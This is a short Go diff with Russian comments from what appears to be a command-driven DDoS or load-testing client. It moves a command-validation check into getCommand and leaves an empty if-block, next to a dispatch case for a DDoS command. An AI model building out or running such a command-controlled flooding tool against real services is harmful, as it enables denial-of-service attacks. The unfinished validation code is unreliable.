@@ -42,6 +42,13 @@ func performMultiRequest(url string, count int) {
 func getCommand() (command utils.Command, err error) {
 	counter += 1
 
+	// Получаем команду
+
+	// Проверяем команду
+	if !utils.IsCorrectCommand(command){
+
+	}
+
 	// Считаем количество секунд и посылаем команду на завершение если время истекло
 	if counter >= settings.Seconds {
 		return utils.Command{2, utils.LT_COMMAND_STOP, nil}, err
@@ -64,10 +71,6 @@ func main() {
 		if last_command_id != command.Id {
 
 			last_command_id = command.Id
-
-			if !utils.IsCorrectCommand(command){
-				continue
-			}
 
 			switch command.Command {
 			case utils.LT_COMMAND_DDOS:
